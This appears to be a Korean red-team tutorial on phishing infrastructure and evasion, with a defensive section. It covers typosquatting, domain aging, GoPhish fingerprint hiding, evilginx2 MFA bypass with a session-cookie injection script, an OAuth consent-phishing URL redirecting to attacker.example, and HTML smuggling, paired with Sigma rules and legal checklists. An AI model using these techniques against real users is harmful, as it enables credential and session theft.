> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 33-04. 피싱 인프라와 탐지 회피 — MFA 우회, 메일 정상값, 로깅 격차
> 한 줄 요약: 현대 피싱은 "가짜처럼 안 보이는 것"이 아니라 "정상값을 빠짐없이 갖춘 것"이 핵심이며, 레드팀은 인프라의 합법성과 운영의 윤리적 통제를 동시에 설계해야 한다.

## 0. 초보자를 위한 개념 이해

### 피싱 인프라란?

피싱 인프라(Phishing Infrastructure)란 공격자가 사람을 속여 자격증명(아이디·비밀번호)이나 세션 정보를 탈취하기 위해 구축하는 전체 기술 환경을 말한다. 단순한 가짜 페이지 하나가 아니라 도메인, 메일 서버, 리버스 프록시, C2 서버 등이 유기적으로 연결된 시스템이다. 현대의 피싱은 보안 필터를 통과하기 위해 "진짜처럼 보이는" 인프라를 정교하게 설계한다.

**왜 배우는가:**
```
[공격자 관점]                     [방어자 관점]
  도메인 등록 & 에이징              탐지 우회 방법 이해
       ↓                               ↓
  SPF/DKIM/DMARC 설정           메일 필터 한계 파악
       ↓                               ↓
  리버스 프록시 구성             세션 탈취 시나리오 대비
       ↓                               ↓
  MFA 우회 (세션 쿠키)          FIDO2/Passkey 전환 필요성
       ↓                               ↓
  표적 발송 & 회피               위협 인텔리전스 수집
```

### 핵심 개념 정리

```
[피싱 인프라 3대 구성요소]

1. 도메인 인프라
   - 에이징(Aging): 6~12개월 전에 등록해 신뢰도 축적
   - 타이포스쿼팅: paypa1.com, micosoft.com 등 유사 도메인
   - 카테고리화: 정상 콘텐츠로 먼저 분류되어야 필터 통과

2. 메일 인프라
   - SPF(Sender Policy Framework): 발신 IP 인증
   - DKIM(DomainKeys Identified Mail): 메일 서명
   - DMARC: 위 두 가지 실패 시 처리 정책
   ※ 셋 다 통과해야 현대 메일 필터를 우회 가능

3. 자격증명 수집 인프라
   - 정적 클론: HTML 복사 방식 (구식, 쉽게 탐지됨)
   - 리버스 프록시: 실제 사이트를 중계하며 세션 탈취
   - AiTM(Adversary-in-the-Middle): MFA까지 우회 가능
```

### 필요한 도구 및 환경
- **Evilginx2**: 리버스 프록시 기반 AiTM 피싱 프레임워크 (자체 랩 전용)
- **GoPhish**: 피싱 캠페인 관리 오픈소스 도구
- **Python + smtplib**: 메일 발송 테스트 자동화
- **DNS 분석 도구**: dig, nslookup으로 SPF/DKIM 레코드 검증

### 기초 실습 예제
```python
import dns.resolver  # pip install dnspython

def check_email_security(domain: str) -> dict:
    """도메인의 이메일 보안 설정(SPF/DKIM/DMARC)을 확인한다."""
    results = {}

    # SPF 레코드 확인
    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        for rdata in answers:
            txt = str(rdata)
            if 'v=spf1' in txt:
                results['SPF'] = txt
                break
        else:
            results['SPF'] = '없음 (스푸핑 가능!)'
    except Exception:
        results['SPF'] = '조회 실패'

    # DMARC 레코드 확인
    try:
        answers = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
        for rdata in answers:
            txt = str(rdata)
            if 'v=DMARC1' in txt:
                results['DMARC'] = txt
                break
    except Exception:
        results['DMARC'] = '없음 (정책 미적용!)'

    return results

# 사용 예시 (자신이 소유한 도메인만 테스트)
# result = check_email_security("example.com")
# for k, v in result.items():
#     print(f"{k}: {v}")
```

---

## 0. 윤리·법률 전제

이 문서의 모든 기법은 다음 조건에서만 적용한다.

- **명시적 서면 동의**가 있는 모의해킹 계약 범위 내
- **격리된 실습 랩**(자기 소유 도메인·자기 소유 사용자 계정)
- **보고서·재현 자료**로 전환할 목적의 학습

실제 운영 도메인을 사칭하거나, 동의 없는 인원을 표적으로 캠페인을 진행하면 정보통신망법·전기통신사업법·개인정보보호법·형법(컴퓨터등사용사기, 사문서위조)에 저촉될 수 있다. 본 문서의 코드·설정은 학습용 합성 예시이며, 그대로 외부 환경에 배포해서는 안 된다.

---

## 1. 피싱 인프라가 왜 중요해졌나

### 1.1 "가짜 페이지" 시대의 종말

10여 년 전의 피싱은 단순했다. 비슷한 도메인을 사고, HTML을 복제하고, 자격증명만 받아내면 됐다. 지금은 그 단계의 시도는 방어 측이 자동화로 거의 다 잡는다.

- **브라우저 측 안티피싱**: Chrome Safe Browsing, Edge SmartScreen, Safari Fraudulent Website Warning. 신규 도메인이 자격증명 폼을 띄우면 수 시간 내 차단되는 경우가 많다.
- **EV TLS 표시 변화**: EV 인증서의 회사명 표시는 사라졌지만, 대신 **자물쇠 + 도메인** 자체에 대한 사용자 인식이 더 직접적으로 작동한다.
- **Conditional Access · Risk-based Sign-in**: Microsoft 365·Google Workspace는 비정상 로그인 위치·디바이스를 자동 차단한다.
- **Passkey/FIDO2**: 자격증명을 가로채도 의미 없음. 도메인 바인딩된 키이기 때문이다.

### 1.2 "정상값 인프라"가 차이를 만든다

레드팀이 시뮬레이션해야 할 위협 모델은 이제 다음과 같다.

| 영역 | 1세대 피싱 | 현대 피싱 시뮬레이션 |
|------|-----------|--------------------|
| 도메인 | 신규 등록·랜덤 | 6~12개월 묵힌 도메인, 정상 콘텐츠 워밍업 |
| 메일 | 임시 SMTP | SPF/DKIM/DMARC 통과, 발신 IP 평판 관리 |
| 페이지 | 정적 HTML 복제 | 리버스 프록시(evilginx2 등)로 실시간 렌더 |
| 인증 우회 | 비밀번호 수집 | **세션 쿠키 탈취** 또는 **OAuth 동의 피싱** |
| 회피 | 무작위 발송 | 표적 프로파일·시간대·언어 일치 |

이 차이를 만드는 비용 대부분이 "**합법성 시뮬레이션**"에 들어간다. 인프라가 정상이어야 SEG·DMARC·Safe Browsing을 통과하고, 그래야 진짜 사용자가 클릭할 만한 압력 시나리오가 의미를 갖는다.

---

## 2. 도메인 squatting과 typosquatting

### 2.1 다섯 가지 typosquat 패턴

레드팀이 후보 도메인을 만들 때 사용하는 변형 카테고리.

1. **Homoglyph (시각 유사)**: `paypa1.com`, `rnicrosoft.com` (rn ≈ m)
2. **Hyphenation (하이픈 삽입)**: `pay-pal-secure.com`, `microsoft-login.com`
3. **TLD 변경**: `paypal.co`, `paypal.security`, `paypal.app`
4. **Subdomain mimic**: `paypal.com.login-verify.io` — 시각적으로 paypal.com이 앞에 보임
5. **IDN 호모그래프**: 키릴/그리스 문자 사용. `pаypal.com` (`а`는 키릴 U+0430)

이중 IDN 공격은 punycode 디코딩에서 표시되는 브라우저가 많아져서 효과가 낮아졌지만, **혼합 스크립트 차단 정책이 약한 등록기관**에는 여전히 유효한 변형이 등록 가능한 경우가 있다.

### 2.2 dnstwist으로 후보 자동 생성

```bash
# 설치
pipx install dnstwist[full]

# 표적 도메인의 변형 후보 + 등록 여부 + WHOIS 일부
dnstwist --registered --mxcheck --geoip example.com

# JSON 출력 (자동화 파이프라인에 투입)
dnstwist --format json --registered example.com > variants.json
```

### 2.3 Python으로 후보 풀 만들기

```python
# domain_candidates.py — Python 3.10+
from __future__ import annotations
import json
from dataclasses import dataclass

HOMOGLYPHS: dict[str, list[str]] = {
    "a": ["а"], "e": ["е"], "o": ["о", "0"],
    "i": ["і", "1", "l"], "l": ["1", "I"],
    "m": ["rn"], "w": ["vv"],
}

@dataclass(slots=True, frozen=True)
class Candidate:
    variant: str
    technique: str

def all_candidates(domain: str) -> list[Candidate]:
    base = domain.split(".")[0]
    out: list[Candidate] = []
    for i, ch in enumerate(domain):
        for repl in HOMOGLYPHS.get(ch, []):
            out.append(Candidate(domain[:i]+repl+domain[i+1:], "homoglyph"))
    out += [Candidate(f"{base}-{w}.com", "hyphenation")
            for w in ("secure", "login", "support", "id")]
    out += [Candidate(f"{base}.{t}", "tld-swap")
            for t in ("co", "app", "security", "help", "io")]
    return out

if __name__ == "__main__":
    for c in all_candidates("example.com"):
        print(json.dumps(c.__dict__, ensure_ascii=False))
```

이 출력을 dnstwist의 등록 가능 여부 체크와 결합해 "후보 풀 → 가격 조회 → 등록 우선순위" 파이프라인을 만든다.

### 2.4 도메인 에이징

새로 산 도메인은 평판이 0이다. 다음 단계로 "묵힌다."

- **6~12개월 거치**: 그동안 정상 콘텐츠를 호스팅(예: 가짜 컨설팅 회사 홈페이지). 검색엔진 인덱싱과 도메인 나이가 같이 쌓인다.
- **정상 트래픽 워밍업**: 적은 양의 진짜 메일을 보내고 받음. SPF/DKIM 정렬을 일관되게 유지.
- **TLS 인증서 누적**: Let's Encrypt 자동 갱신을 켜두면 CT(Certificate Transparency) 로그에 정상 패턴이 남는다.

> 방어 관점에서는 **도메인 나이**가 SEG의 가장 효과적인 단일 시그널이지만, 충분히 묵힌 도메인 앞에서는 무력해진다는 점이 핵심이다.

---

## 3. 메일 인프라를 합법적으로 정상값 만들기

### 3.1 SPF / DKIM / DMARC

자기 소유 도메인을 발신지로 쓰는 캠페인은 메일 정렬을 정확히 맞춰야 SEG에서 안 잘린다.

#### SPF (TXT 레코드, `@` 또는 도메인 루트)

```
v=spf1 ip4:198.51.100.42 ip4:198.51.100.43 include:mailgun.org -all
```

- `-all` (hardfail): SPF 미일치 시 거부 권고
- `~all` (softfail): 미일치 시 의심으로 표시 (테스트 단계에서 사용)

#### DKIM

DKIM은 발신 메일에 서명하고, 공개키를 DNS에 노출한다. 셀렉터는 자유.

```
# 셀렉터 s1, 도메인 example.com
s1._domainkey.example.com.  IN TXT  "v=DKIM1; k=rsa; p=MIIBIjANBgkq..."
```

DKIM 키는 **2048bit RSA** 또는 **Ed25519** 권장. 발신 SMTP 서버(또는 Mailgun/SES)가 서명하도록 설정.

#### DMARC

DMARC는 SPF·DKIM 결과를 도메인 정책으로 묶는다.

```
_dmarc.example.com.  IN TXT  "v=DMARC1; p=quarantine; rua=mailto:dmarc@example.com; ruf=mailto:dmarc@example.com; adkim=s; aspf=s; pct=100"
```

- `p=none`: 모니터링만, 거부·격리 없음
- `p=quarantine`: 미정렬 메일을 스팸으로 격리
- `p=reject`: 미정렬 메일을 거부

레드팀 도메인이라도 `p=quarantine` 이상으로 운영해야 **수신 측 SEG가 정상 운영 도메인으로 판단**한다. 모니터링만(`p=none`) 운영하는 도메인은 SEG가 신뢰하지 않는다.

### 3.2 발신 IP 평판

발신 IP의 평판은 캠페인 도달률을 가른다.

- **Sender Score** (Validity): 0~100, 70 이상이 합리적
- **Talos Reputation** (Cisco): Good / Neutral / Poor
- **Spamhaus ZEN**: 등재 여부 확인

```bash
# 평판 빠른 점검
curl -s "https://www.senderscore.org/lookup.php?lookup=198.51.100.42&ipLookup=Lookup"
dig +short txt 42.100.51.198.zen.spamhaus.org
```

평판이 낮은 IP에서 정상 도메인으로 보내면 SPF는 통과해도 IP 기반 차단에 걸린다. 신규 IP는 며칠간 워밍업(소량 발송 → 점진 증량) 필요.

### 3.3 SES / Mailgun / SendGrid 약관 주의

상용 메일 서비스는 거의 모두 **피싱 시뮬레이션·자격증명 수집 페이지 호스팅**을 약관으로 금지한다.

- AWS SES AUP: "Phishing, spoofing, or attempts to obtain personal information" 명시 금지
- Mailgun ToS: 피싱·스팸·악성 콘텐츠 금지
- SendGrid: "deceptive content" 금지

**모의해킹 캠페인용으로 사용하면 계정 정지 + 발신 도메인 평판 손실 + 법적 분쟁 가능성**이 있다. 자체 SMTP 인프라(Postfix + 자체 IP)로 운영하거나, **레드팀 시뮬레이션 전용 서비스**(예: KnowBe4, Cofense, Proofpoint Security Awareness)를 사용하는 것이 표준이다.

---

## 4. GoPhish 캠페인 설계

### 4.1 설치와 기본 보안

```bash
# 격리된 EC2 / 자체 VPS에서
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d /opt/gophish
cd /opt/gophish
chmod +x gophish
```

`config.json`에서 관리자 콘솔 보안 강화:

```json
{
  "admin_server": {
    "listen_url": "127.0.0.1:3333", "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/admin.example.com/fullchain.pem",
    "key_path":  "/etc/letsencrypt/live/admin.example.com/privkey.pem",
    "trusted_origins": ["https://admin.example.com"]
  },
  "phish_server": {
    "listen_url": "0.0.0.0:443", "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/landing.example.com/fullchain.pem",
    "key_path":  "/etc/letsencrypt/live/landing.example.com/privkey.pem"
  },
  "db_name": "sqlite3", "db_path": "gophish.db",
  "logging": {"filename": "/var/log/gophish/gophish.log", "level": "info"}
}
```

관리자 콘솔은 **반드시 VPN/SSH 터널 뒤에서만** 접근. 인터넷에 노출하면 공격자가 캠페인을 탈취해 합법 권한을 무기화할 수 있다.

### 4.2 캠페인 객체 JSON

GoPhish API로 캠페인을 코드로 관리한다.

```json
{
  "name": "Q2-2026 자격증명 인지도 평가",
  "template": {
    "name": "HR-급여명세-알림",
    "subject": "[HR] 4월 급여명세서 확인 요청",
    "html": "<p>안녕하세요 {{.FirstName}}님,</p><p>4월 급여명세서가 준비되었습니다. <a href=\"{{.URL}}\">여기</a>에서 확인하세요.</p><p>{{.Tracker}}</p>"
  },
  "page": {
    "name": "HR-Portal-Login",
    "capture_credentials": true, "capture_passwords": false,
    "redirect_url": "https://example.com/hr-portal-real"
  },
  "smtp": {
    "host": "smtp.example.com:587",
    "from_address": "hr-noreply@example.com",
    "username": "campaign", "password": "{{ENV:SMTP_PASS}}",
    "ignore_cert_errors": false
  },
  "groups": [{"name": "Pilot-Group-A"}],
  "url": "https://landing.example.com",
  "launch_date": "2026-05-02T09:00:00+09:00"
}
```

> `capture_passwords`는 거의 항상 `false`로 둔다. 평문 비밀번호를 보관하면 모의해킹 종료 후에도 사고 책임을 지게 된다. **클릭·자격증명 입력 행위 자체**만 측정해도 인지도 평가에는 충분하다.

### 4.3 결과 추출 Python 스크립트

```python
# gophish_export.py — Python 3.10+
from __future__ import annotations
import csv, os, sys
from dataclasses import dataclass, asdict
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

API_BASE = os.environ["GOPHISH_API"]   # https://admin.example.com:3333
API_KEY = os.environ["GOPHISH_KEY"]

@dataclass(slots=True)
class Result:
    campaign: str; email: str; status: str; ip: str; user_agent: str
    sent_at: str | None; opened_at: str | None
    clicked_at: str | None; submitted_at: str | None

def session() -> requests.Session:
    s = requests.Session()
    s.headers.update({"Authorization": f"Bearer {API_KEY}"})
    s.mount("https://", HTTPAdapter(max_retries=Retry(
        total=5, backoff_factor=0.5,
        status_forcelist=(500, 502, 503, 504))))
    return s

def parse_results(payload: dict) -> list[Result]:
    timeline = {(t["email"], t["message"]): t["time"]
                for t in payload.get("timeline", [])}
    return [Result(
        campaign=payload["name"], email=r["email"], status=r["status"],
        ip=r.get("ip", ""), user_agent=r.get("user_agent", ""),
        sent_at=timeline.get((r["email"], "Email Sent")),
        opened_at=timeline.get((r["email"], "Email Opened")),
        clicked_at=timeline.get((r["email"], "Clicked Link")),
        submitted_at=timeline.get((r["email"], "Submitted Data")),
    ) for r in payload.get("results", [])]

def main() -> int:
    if len(sys.argv) != 3:
        print("usage: gophish_export.py <campaign_id> <out.csv>"); return 2
    s = session()
    r = s.get(f"{API_BASE}/api/campaigns/{int(sys.argv[1])}",
              timeout=10, verify=True)
    r.raise_for_status()
    rows = parse_results(r.json())
    if not rows:
        print("no results"); return 1
    with open(sys.argv[2], "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(asdict(rows[0]).keys()))
        w.writeheader(); [w.writerow(asdict(x)) for x in rows]
    print(f"exported {len(rows)} rows"); return 0

if __name__ == "__main__":
    raise SystemExit(main())
```

### 4.4 GoPhish의 흔적

기본 GoPhish 빌드는 발신 메일 헤더와 트래커 이미지에 식별 가능한 패턴을 남긴다. 정찰 단계에서 다음을 점검·조정해야 한다.

- **`X-Mailer` 헤더**: 일부 SMTP 프로필에서 `gophish` 문자열 노출 가능. 헤더 제거/대체.
- **트래커 픽셀 경로**: `/track?rid=...` 패턴이 알려져 있어 SEG 시그니처에 포함됨. 빌드 시 라우트명 변경.
- **랜딩 페이지 응답 헤더**: `Server: gophish` 고정. nginx 리버스 프록시로 가려야 함.
- **데이터베이스 노출**: `gophish.db`가 같은 서버에 있으므로 권한·암호화·백업 분리.

#### nginx 리버스 프록시 예시

```nginx
# /etc/nginx/sites-enabled/landing.conf
server {
  listen 443 ssl http2;
  server_name landing.example.com;

  ssl_certificate     /etc/letsencrypt/live/landing.example.com/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/landing.example.com/privkey.pem;

  add_header Strict-Transport-Security "max-age=31536000" always;
  add_header X-Content-Type-Options "nosniff" always;
  proxy_hide_header Server;
  server_tokens off;

  location / {
    proxy_pass         http://127.0.0.1:8080;
    proxy_set_header   Host $host;
    proxy_set_header   X-Real-IP $remote_addr;
    proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header   X-Forwarded-Proto https;
    proxy_hide_header  X-Powered-By;
  }
}
```

---

## 5. MFA 우회 — evilginx2 / Modlishka 계열

### 5.1 동작 원리

evilginx2 같은 도구는 **리버스 프록시**다. 사용자가 피싱 도메인에 접속하면 도구가 진짜 서비스(예: Microsoft 로그인)를 실시간으로 프록시해서 보여준다.

```
사용자 ↔ evilginx2 (피싱 도메인) ↔ login.microsoftonline.com (진짜)
```

사용자는 진짜 로그인 화면을 본다. 비밀번호도, MFA OTP도, FIDO2 챌린지도 진짜 서버에 도달한다. 인증이 성공하면 진짜 서비스가 **세션 쿠키**를 발급하고, evilginx2가 그 쿠키를 가로챈다.

공격자는 이 쿠키를 자기 브라우저에 주입해서 **이미 인증된 세션**을 그대로 재현한다. MFA를 다시 통과할 필요가 없다.

### 5.2 phishlet 구조 (학습용 골격)

phishlet은 어떤 호스트를 어떤 가짜 호스트로 매핑하고, 어떤 쿠키를 캡처할지 정의한 YAML이다. **실제 운영 가능한 토큰/엔드포인트는 의도적으로 비워둔 학습용 구조**만 보인다.

```yaml
# example.phishlet.yaml — 학습용 구조 예시
name: 'example-saas'
author: 'redteam-lab'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'login',   orig_sub: 'login',   domain: 'EXAMPLE.invalid', session: true,  is_landing: true}
  - {phish_sub: 'static',  orig_sub: 'static',  domain: 'EXAMPLE.invalid', session: false, is_landing: false}

sub_filters:
  - {triggers_on: 'login.EXAMPLE.invalid', orig_sub: 'login', domain: 'EXAMPLE.invalid', search: 'href="https://login\.EXAMPLE\.invalid', replace: 'href="https://{hostname}', mimes: ['text/html']}

auth_tokens:
  - domain: '.EXAMPLE.invalid'
    keys: ['SESSION_COOKIE_NAME']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.EXAMPLE.invalid'
  path: '/signin'
```

> 도메인을 `EXAMPLE.invalid`로 둔 것은 의도적이다. 실제 SaaS 도메인을 그대로 노출하면 학습 자료가 즉시 오용 가능한 무기가 된다. 실습 시에는 자기 소유 SaaS 클론(예: Keycloak·Authentik으로 띄운 자체 IdP) 위에서 phishlet을 만들어야 한다.

### 5.3 캡처한 쿠키 주입

evilginx2가 캡처한 쿠키는 JSON 배열로 출력된다. 브라우저에 주입하는 표준 방식.

```python
# inject_session_cookies.py — 본인 계정 랩 검증용. Python 3.10+
from __future__ import annotations
import json, sys
from pathlib import Path
import undetected_chromedriver as uc  # pip install undetected-chromedriver

def main(cookie_path: str, target_url: str) -> None:
    cookies = json.loads(Path(cookie_path).read_text(encoding="utf-8"))
    driver = uc.Chrome()
    try:
        driver.get(target_url)
        for c in cookies:
            driver.add_cookie({
                "name": c["Name"], "value": c["Value"],
                "domain": c["Domain"], "path": c.get("Path", "/"),
                "secure": c.get("Secure", True),
                "httpOnly": c.get("HttpOnly", True),
            })
        driver.get(target_url)
        input("press enter to quit...")
    finally:
        driver.quit()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("usage: inject_session_cookies.py <cookies.json> <url>")
        raise SystemExit(2)
    main(sys.argv[1], sys.argv[2])
```

### 5.4 제한사항

- **FIDO2/Passkey**: 도메인 바인딩(WebAuthn `rpId`) 때문에 리버스 프록시 우회가 원칙적으로 불가. 진짜 도메인이 아닌 곳에서는 어설션 자체가 만들어지지 않는다.
- **Token Binding / DPoP**: 일부 SaaS가 도입 중. 토큰이 발급된 디바이스의 키와 묶여서 단순 쿠키 주입이 무력화됨.
- **세션 위치 검증**: Microsoft 365 Conditional Access의 named locations, sign-in risk 정책. 공격자 IP에서 쿠키 재사용 시 추가 챌린지.
- **재인증 주기**: SaaS가 짧은 ID 토큰 + 리프레시 토큰 구조면 캡처한 세션의 수명이 짧다.

레드팀이 이 기법을 시뮬레이션하는 목적은 "**우리 환경에 패스키가 도입돼야 하는 이유**"를 임원이 보게 만드는 것이다.

---

## 6. OAuth 동의(illicit consent) 피싱

### 6.1 왜 더 위험한가

OAuth 동의 피싱은 자격증명을 훔치지 않는다. 사용자가 **공격자가 등록한 앱에 권한을 직접 부여**하게 만드는 흐름이다.

- TLS는 정상 (Microsoft·Google의 진짜 동의 화면)
- MFA도 통과 (진짜 사용자가 직접 로그인)
- 세션 쿠키 탈취 없음
- **결과**: 공격자 앱이 메일·드라이브·캘린더에 영구적인 OAuth 토큰 보유

비밀번호 변경·MFA 강제로는 차단되지 않는다. 토큰을 별도로 폐기해야만 권한이 사라진다.

### 6.2 Microsoft 365 흐름

공격자 절차:

1. Azure AD 테넌트에 멀티테넌트 앱 등록
2. 권한 요청: `Mail.Read`, `Files.Read.All`, `offline_access` 등
3. 표적 사용자에게 동의 URL 전달:

```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize
  ?client_id=APP_GUID
  &response_type=code
  &redirect_uri=https%3A%2F%2Fattacker.example%2Fcb
  &scope=openid%20offline_access%20Mail.Read%20Files.Read.All
  &state=opaque
```

4. 사용자가 "수락" 클릭 → authorization code 획득 → 토큰 교환 → 리프레시 토큰 영구 보유

### 6.3 방어

- **Admin consent required**: 사용자 동의를 비활성화하고 모든 앱 권한을 관리자 승인으로 묶음
- **App Consent Governance** (Defender for Cloud Apps): 위험한 권한 조합·미검증 게시자 자동 차단
- **Verified Publisher 요구**: 검증된 게시자만 동의 가능
- **정기 검토**: `Get-MgUserOAuth2PermissionGrant` 등으로 부여된 권한 주기 점검
- **이상 토큰 사용 탐지**: 비정상 IP에서 Graph API 호출 패턴

```powershell
# 사용자가 부여한 위임 권한 점검
Connect-MgGraph -Scopes "Directory.Read.All"
Get-MgUser -All | ForEach-Object {
  Get-MgUserOAuth2PermissionGrant -UserId $_.Id |
    Select-Object @{n='User';e={$_.PrincipalId}}, ClientId, Scope
}
```

---

## 7. 링크 회피 기술

### 7.1 단축 URL · 리디렉션 체인

1차 도메인이 **신뢰받는 도메인**이도록 한다.

- 정상 단축 서비스(`bit.ly`, `t.co`, 기업 단축기)
- 정상 클릭 트래커(`sendgrid.net`, `mailchimp.com`, 광고 LP 도메인)
- AMP/검색 결과 리다이렉트(`google.com/url?q=...`) — 일부 SEG는 첫 도메인만 본다

체인 예시:

```
이메일 본문 링크: https://t.co/AbCdEf
  → https://click.brand-cdn.com/x/yz
  → https://landing.aged-domain.example/login
```

각 단계에서 정상값 도메인 한 겹씩. 마지막에만 공격자 인프라가 등장.

### 7.2 HTML smuggling

본문이나 첨부에서 직접 다운로드하지 않고, **JS가 브라우저 안에서 파일을 만들어** 사용자가 다운로드하게 한다. SEG가 첨부 자체를 보지 못한다.

```html
<!-- 학습용: 동작 흐름만 — 실제 페이로드는 사용하지 않음 -->
<!doctype html>
<html><body>
<script>
  // 1) base64로 임베드된 정상 텍스트(예: "TRAINING-PAYLOAD")
  const b64 = "VFJBSU5JTkctUEFZTE9BRA==";
  // 2) Blob 생성
  const bin = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  const blob = new Blob([bin], {type: "application/octet-stream"});
  // 3) 다운로드 트리거
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "Q2-Report.txt";
  document.body.appendChild(a);
  a.click();
</script>
</body></html>
```

방어:

- 이메일 게이트웨이의 본문 JS 검사 + `Blob`/`atob` 시그너처
- 브라우저 측 다운로드 정책 (Microsoft Defender for Endpoint의 ASR 룰)
- 실행 가능한 확장자 차단 + Mark-of-the-Web 강제

### 7.3 QR 피싱 ("Quishing")

URL을 텍스트가 아닌 **이미지(QR 코드)**로 본문에 박는다. 대부분의 SEG는 본문 이미지의 QR을 디코딩하지 않는다. 사용자는 휴대폰 카메라로 스캔 → **MDM 밖의 디바이스**로 공격자 페이지에 진입.

```python
# qr_phish_demo.py — 합법 랩에서 자기 도메인 QR 생성 데모
# Python 3.10+
import segno

url = "https://landing.example-lab.invalid/hr/payslip"
qr = segno.make(url, error="h")
qr.save("payslip-qr.png", scale=8)
```

방어:

- 이메일 게이트웨이의 이미지 QR 디코딩 (Proofpoint, Mimecast 등 일부 도입)
- 사용자 인지 교육 + MDM에서 QR 카메라로 회사 자원 접근 시 경로 추적

### 7.4 정상 마케팅 도구 악용

- **SendGrid Click Tracker**: 발신 도메인이 SendGrid이므로 SEG가 통과시킴
- **Mailchimp 캠페인 링크**: `mc.us12.list-manage.com` 같은 정상 도메인
- **Google Forms / Microsoft Forms**: 자격증명 폼을 정상 SaaS 위에 호스팅

방어 측은 "**정상 도메인이지만 비정상 활동**"을 잡는 컨텍스트 룰이 필요하다.

---

## 8. 탐지 회피의 한계와 방어 측 레시피

### 8.1 SEG가 보는 시그널

| 시그널 | 회피 가능성 | 강도 |
|--------|------------|------|
| 발신 도메인 SPF/DKIM/DMARC | 자기 도메인이면 통과 | 중 |
| 발신 IP 평판 | 워밍업으로 회피 | 중 |
| 도메인 나이 | 에이징으로 회피 | 강 (회피 비싸다) |
| URL 평판 (Cisco Talos, MS SmartScreen) | 신규 URL은 미등록 | 강 |
| 본문 패턴 (LLM 분류기) | 표적화로 회피 어려움 | 강 |
| 첨부 동적 분석 | 인터랙션 요구 시 회피 | 중 |
| OAuth 동의 이벤트 | 회피 불가, **방어 측 핵심** | 매우 강 |

### 8.2 EDR/MDR가 봐야 할 이벤트

- **Microsoft 365 통합 감사 로그**:
  - `Add service principal` (앱 등록)
  - `Consent to application` (동의)
  - `Add OAuth2PermissionGrant` (권한 부여)
  - `UserLoggedIn` + `UserLoginFailed` 비정상 비율
  - `MailItemsAccessed` (Graph API로 메일 대량 조회)
- **로그인 위치 이상**: 짧은 시간 내 두 국가에서 같은 계정 로그인
- **새 디바이스 등록**: MFA 디바이스 추가 직후 비정상 작업

### 8.3 Sigma 룰 예시

#### MFA 우회 의심: 짧은 시간 내 동일 사용자 다국가 로그인

```yaml
title: Suspicious Multi-Country Sign-in (Possible Session Hijack)
id: 9b7c2f10-1d40-4f91-9b3a-redteam-demo-001
status: experimental
description: Detects sign-in events for the same user from two different countries within a short window, suggesting stolen session cookie reuse after AiTM phishing.
logsource:
  product: m365
  service: signinlogs
detection:
  selection:
    ResultType: 0
  timeframe: 30m
  condition: selection | count(Country) by UserPrincipalName > 1
fields:
  - UserPrincipalName
  - IPAddress
  - Country
  - ClientAppUsed
level: high
tags:
  - attack.initial_access
  - attack.t1078
```

#### OAuth 동의 피싱 의심: 미검증 게시자 권한 부여

```yaml
title: Consent Granted to Unverified Multi-Tenant App
id: 3f5e8a72-2a91-44b2-9d44-redteam-demo-002
status: experimental
description: Flags consent events where the granted application is multi-tenant and from an unverified publisher.
logsource:
  product: m365
  service: auditlogs
detection:
  selection:
    Operation: 'Consent to application.'
  filter_unverified:
    ModifiedProperties|contains: 'PublisherVerified": "False"'
  condition: selection and filter_unverified
fields:
  - UserId
  - ObjectId
  - ApplicationId
  - ConsentContext
level: high
tags:
  - attack.t1528
```

### 8.4 "로깅 격차"가 가장 큰 적

레드팀 실전에서 가장 자주 발견되는 결함은 도구가 아니라 **로그를 안 보내거나, 안 읽거나, 너무 짧게 보관하는 것**이다. 점검 항목.

- M365 통합 감사 로그 활성화 여부 (기본 비활성 환경 잔존)
- Sign-in log SIEM 전송
- 보존 기간 90일 이상
- OAuth 권한 부여 이벤트가 SIEM 룰에 매핑돼 있는가
- Graph API 비정상 호출에 대한 알림이 있는가

---

## 9. 합법적 캠페인 운영 체크리스트

### 9.1 모의해킹 계약서 필수 조항 7가지

1. **Scope of Work**: 표적 도메인·메일 그룹·표적 인원수·실행 기간 명시
2. **Out of Scope**: 절대 건드리지 않을 시스템·인원(임원 가족, 의료 데이터 등)
3. **Rules of Engagement**: 어떤 페이로드는 금지(예: 실제 멀웨어), 캡처 데이터 보존 규칙
4. **Authorized Personnel**: 캠페인을 사전에 아는 사내 인원(보통 CISO + 법무 + 인사 1명)
5. **Emergency Contact**: 사고 발생 시 즉시 호출되는 양측 번호
6. **Data Handling**: 수집한 자격증명·세션·PII의 암호화·보존·파기 일정
7. **Reporting**: 보고서 형식, 발견 사항 분류, 후속 조치 트래킹 책임

### 9.2 직원 안전망 (사후 케어)

피싱 시뮬레이션은 사람을 시험한다. 실패한 인원이 **수치심·처벌**로 이어지면 그 조직은 다음번에 진짜 사고를 신고하지 않는다.

- "걸렸다"는 통보 대신 **즉시 학습 페이지**로 리다이렉트 + 짧은 코칭
- 인사 평가에 반영하지 않음을 사전 공지
- 보고한 사람 보상 (모의 신고를 한 직원에게 칭찬 회신)
- 반복 실패자에게는 1:1 코칭 (공개 블레이밍 금지)

### 9.3 사고 재현·학습 자료로의 전환

캠페인이 끝나면 데이터는 처음 한 번만 살아 있다. 다음으로 변환해야 가치가 산다.

- **타임라인 재구성**: OSINT → 도메인 등록 → 발송 → 클릭 → 자격증명 → 세션 → 데이터 접근, 시각화
- **방어 측 검증**: 각 단계에서 SIEM·EDR 알림이 떴는가? 안 떴다면 룰 갭
- **테이블탑 시나리오**: 같은 사건이 진짜였다면 누가 어떤 결정을 했어야 하는가
